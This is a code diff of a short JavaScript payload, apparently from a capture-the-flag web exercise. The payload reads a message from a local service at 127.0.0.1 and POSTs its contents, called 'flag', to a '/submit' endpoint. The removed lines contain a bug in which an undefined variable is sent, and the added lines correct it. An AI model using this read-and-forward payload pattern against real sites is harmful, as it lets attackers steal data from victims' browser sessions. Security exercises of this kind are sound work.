@@ -1,13 +1,13 @@
-fetch("http://127.0.0.1:1337/message/3").then(response => {
-	return response.text()
-}).then(flag => {
-	fetch("http://127.0.0.1:1337/submit", {
-		"method": "POST",
-		"headers": {
-            "Content-Type": "application/json"
+fetch("http://127.0.0.1:80/message/3").then((r) => {
+    return r.text();
+}).then((x) => {
+    fetch("http://127.0.0.1:80/submit", {
+        "headers": {
+            "content-type": "application/json"
         },
         "body": x,
+        "method": "POST",
         "mode": "cors",
         "credentials": "omit"
-	})
-})
+    });
+});
